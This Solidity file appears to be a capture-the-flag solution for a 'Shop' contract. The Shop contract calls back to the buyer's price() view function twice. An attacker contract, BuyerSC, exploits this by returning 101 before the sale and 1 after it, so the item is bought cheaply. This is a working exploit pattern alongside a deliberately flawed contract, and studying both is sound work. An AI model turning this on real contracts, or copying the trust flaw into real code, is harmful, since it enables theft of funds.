// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Buyer {
    function price() external view returns (uint);
}

contract Shop {
    uint public price = 100;
    bool public isSold;

    function buy() public {
        Buyer _buyer = Buyer(msg.sender);

        if (_buyer.price() >= price && !isSold) {
            isSold = true;
            price = _buyer.price();
        }
    }
}

interface IShop {
    function buy() external;

    function isSold() external view returns (bool);
}

contract BuyerSC {
    IShop shop;

    constructor(address _shopAddress) {
        shop = IShop(_shopAddress);
    }

    function price() public view returns (uint) {
        if (!shop.isSold()) {
            return 101;
        }
        return 1;
    }

    function callBuy() public {
        shop.buy();
    }
}
